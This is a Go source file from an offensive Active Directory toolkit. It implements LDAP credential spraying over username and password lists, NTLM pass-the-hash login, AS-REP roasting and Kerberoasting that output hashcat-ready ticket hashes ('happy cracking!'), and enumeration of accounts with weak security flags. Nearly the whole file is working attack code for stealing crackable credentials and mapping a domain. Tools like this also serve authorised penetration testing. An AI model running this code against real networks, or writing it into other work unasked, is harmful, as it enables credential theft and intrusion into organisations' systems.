package goad

import (
	"fmt"
	"sync"

	"github.com/5amu/goad/kerberos"
	"github.com/5amu/goad/ldap"
)

type LdapOptions struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		NTLM     string `short:"H" long:"hashes" description:"authenticate with NTLM hash"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
		Port     int    `long:"port" default:"389" description:"Ldap port to contact"`
		SSL      bool   `short:"s" long:"ssl" description:"Use ssl to interact with ldap"`
		UseTLS   bool   `long:"tls" description:"Upgrade the ldap connection"`
	} `group:"Connection Options" description:"Connection Options"`

	Hashes struct {
		AsrepRoast string `long:"asreproast" description:"Grab AS_REP ticket(s) parsed to be cracked with hashcat"`
		Kerberoast string `long:"kerberoast" description:"Grab TGS ticket(s) parsed to be cracked with hashcat"`
	} `group:"Hash Retrieval Options" description:"Hash Retrieval Options"`

	Enum struct {
		TrustedForDelegation bool `long:"trusted-for-delegation" description:"Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"`
		PasswordNotRequired  bool `long:"password-not-required" description:"Get the list of users with flag PASSWD_NOTREQD"`
		PasswordNeverExpires bool `long:"password-never-expires" description:"Get the list of accounts with flag DONT_EXPIRE_PASSWD"`
		AdminCount           bool `long:"admin-count" description:"Get objets that had the value adminCount=1"`
		Users                bool `long:"users" description:"Enumerate enabled domain users"`
		ActiveUsers          bool `long:"active-users" description:"Enumerate active enabled domain users"`
		Groups               bool `long:"groups" description:"Enumerate domain groups"`
		DCList               bool `long:"dc-list" description:"Enumerate Domain Controllers"`
		GetSID               bool `long:"get-sid" description:"Get domain sid"`
	} `group:"Enumeration Options" description:"Enumeration Options"`

	GMSA struct {
		GMSA           bool   `long:"gmsa" description:"Enumerate GMSA passwords"`
		GMSAConvertID  string `long:"gmsa-convert-id" description:"Get the secret name of specific gmsa or all gmsa if no gmsa provided"`
		GMSADecryptLSA string `long:"gmsa-decrypt-lsa" description:"Decrypt the gmsa encrypted value from LSA"`
	} `group:"Play with GMSA" description:"Play with GMSA"`

	BH struct {
		Bloodhound           string   `long:"bloodhound" description:"Run bloodhound collector (v4.2) and save in output file (zip)"`
		BloodhoundNameserver string   `short:"n" long:"nameserver" description:"Provide a nameserver for bloodhound collector"`
		Collection           []string `short:"c" long:"collection" default:"Default" description:"Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All"`
	} `group:"Run Bloodhound Collector v4.2" description:"Run Bloodhound Collector v4.2"`

	targets     []string
	filter      string
	credentials []credential
}

func (o *LdapOptions) Run() (err error) {
	if o.Connection.NTLM != "" {
		o.credentials = NewCredentialsNTLM(
			sliceFromString(o.Connection.Username),
			o.Connection.NTLM,
		)
	} else {
		o.credentials = NewCredentialsClusterBomb(
			sliceFromString(o.Connection.Username),
			sliceFromString(o.Connection.Password),
		)
	}

	for _, t := range o.Targets.TARGETS {
		o.targets = append(o.targets, sliceFromString(t)...)
	}

	var f func(string) error

	if o.Hashes.AsrepRoast != "" {
		f = o.asreproast
	} else if o.Hashes.Kerberoast != "" {
		f = o.kerberoast
	} else if o.Enum.GetSID {
		f = o.domainSID
	} else if o.Enum.TrustedForDelegation {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.UACFilter(ldap.TRUSTED_FOR_DELEGATION),
		)
		f = o.enumeration
	} else if o.Enum.PasswordNotRequired {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.UACFilter(ldap.PASSWD_NOTREQD),
		)
		f = o.enumeration
	} else if o.Enum.Users {
		o.filter = ldap.FilterIsUser
		f = o.enumeration
	} else if o.Enum.ActiveUsers {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
		)
		f = o.enumeration
	} else if o.Enum.Groups {
		o.filter = ldap.FilterIsGroup
		f = o.enumeration
	} else if o.Enum.DCList {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsComputer,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.UACFilter(ldap.SERVER_TRUST_ACCOUNT),
		)
		f = o.enumeration
	} else if o.Enum.PasswordNeverExpires {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.UACFilter(ldap.DONT_EXPIRE_PASSWORD),
		)
		f = o.enumeration
	} else if o.Enum.AdminCount {
		o.filter = ldap.JoinFilters(
			ldap.FilterIsUser,
			ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
			ldap.FilterIsAdmin,
		)
		f = o.enumeration
	} else {
		return fmt.Errorf("nothing to do")
	}

	var wg sync.WaitGroup
	for _, target := range o.targets {
		wg.Add(1)
		go func(t string) {
			if err := f(t); err != nil {
				fmt.Println(err)
			}
			wg.Done()
		}(target)
	}
	wg.Wait()
	return nil
}

func (o *LdapOptions) authenticate(ldapClient *ldap.LdapClient) (credential, error) {
	for _, creds := range o.credentials {
		if creds.Hash != "" {
			if err := ldapClient.AuthenticateNTLM(creds.Username, creds.Hash); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, creds.Username, creds.Hash, err)
			} else {
				return creds, nil
			}
		} else {
			if err := ldapClient.Authenticate(creds.Username, creds.Password); err != nil {
				fmt.Printf("[%s\\%s:%s] %v\n", o.Connection.Domain, creds.Username, creds.Password, err)
			} else {
				return creds, nil
			}
		}
	}
	return credential{}, fmt.Errorf("no valid authentication")
}

func (o *LdapOptions) asreproast(target string) error {
	var res []string
	for _, creds := range o.credentials {
		client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
		if err != nil {
			return err
		}
		asrep, err := client.GetAsReqTgt(creds.Username)
		if err == nil {
			hash := kerberos.ASREPToHashcat(*asrep.Ticket)
			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.Connection.Domain, creds.Username, hash)
			res = append(res, hash)
		}
	}

	if len(res) == 0 {
		return fmt.Errorf("[%s] no asrep-roastable user found on target", target)
	}
	return writeLines(res, o.Hashes.AsrepRoast)
}

func (o *LdapOptions) kerberoast(target string) error {
	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
	ldapFilter := ldap.JoinFilters(
		ldap.FilterIsUser,
		ldap.NegativeFilter(ldap.UACFilter(ldap.ACCOUNTDISABLE)),
		ldap.NewFilter(ldap.ServicePrincipalName, "*"),
	)
	defer lclient.Close()

	krb5client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		return err
	}

	creds, err := o.authenticate(lclient)
	if err != nil {
		return err
	}
	krb5client.AuthenticateWithPassword(creds.Username, creds.Password)

	return lclient.FindObjectsWithCallback(ldapFilter, func(users []map[string]string) error {
		var res []string
		for _, entry := range users {
			usr := entry[ldap.SAMAccountName]
			spn := entry[ldap.ServicePrincipalName]
			tgs, err := krb5client.GetServiceTicket(usr, spn)
			if err != nil {
				return err
			}
			hash := kerberos.TGSToHashcat(tgs.Ticket, usr)
			res = append(res, hash)
			fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.Connection.Domain, usr, spn, hash)
		}
		if len(res) == 0 {
			return fmt.Errorf("[%s] no kerberoastable user found on target", target)
		}
		return writeLines(res, o.Hashes.Kerberoast)
	}, ldap.SAMAccountName, ldap.ServicePrincipalName)
}

func (o *LdapOptions) enumeration(target string) error {
	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
	defer lclient.Close()

	creds, err := o.authenticate(lclient)
	if err != nil {
		return err
	}
	return lclient.FindADObjectsWithCallback(o.filter, func(obj ldap.ADObject) error {
		_, err := fmt.Printf("[%s]-[%s\\%s]  %s\\%s\n",
			target, o.Connection.Domain, creds.String(),
			o.Connection.Domain, obj.SAMAccountName,
		)
		return err
	})
}

func (o *LdapOptions) domainSID(target string) error {
	lclient := ldap.NewLdapClient(target, o.Connection.Port, o.Connection.Domain, o.Connection.SSL, !o.Connection.UseTLS)
	defer lclient.Close()

	creds, err := o.authenticate(lclient)
	if err != nil {
		return err
	}

	sid, err := lclient.GetDomainSID()
	if err != nil {
		return err
	}
	fmt.Printf("[%s]-[%s\\%s:%s] %v\n", target, o.Connection.Domain, creds.Username, creds.Password, sid)
	return nil
}
